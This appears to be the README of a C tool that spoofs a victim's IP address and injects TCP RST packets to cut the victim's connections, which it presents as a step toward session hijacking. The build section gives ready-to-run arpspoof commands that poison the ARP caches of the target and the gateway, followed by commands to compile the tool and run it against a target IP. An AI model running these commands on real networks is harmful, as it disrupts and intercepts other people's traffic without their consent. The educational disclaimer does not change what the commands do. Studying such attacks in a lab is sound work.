# TCP-IP-Hijack-via-RST-signal-
(Wrriten in C)TCP/IP hijack using PCAP and LIBNET library for capturing and injection TCP/IP packages - This code simply spoof victim ip address , and send TCP/IP packet to DST using RST flag , so Victim machine loose access to the internet , Fundamental of how to fully hijack a session.

**Disclaimer:**  
This code is provided for educational and research purposes only. Do **not** use it on networks or devices you do not own or have explicit permission to test.  
The author is not responsible for misuse.

## How to Build
-For this code to work on a switched network , first you need to arp spoof , so you can sniff all the data that are passing through the network

```sh
sudo arpspoof -i <your-interface> -t <target-machine-ip> <gateway-ip>
sudo arpspoof -i <your-interface> -t <gateway-ip> <target-machine-ip>
sudo gcc RST_Hijack.c -o rst_hijack -lpcap -lnet
sudo ./rst_hijack <Target-machine-ip>
```

## Files
- `RST_Hijack.c`: Main logic
- `Fatal.c`: Helper functions

##Requirements
- libpcap library
- libnet library
- arpspoof



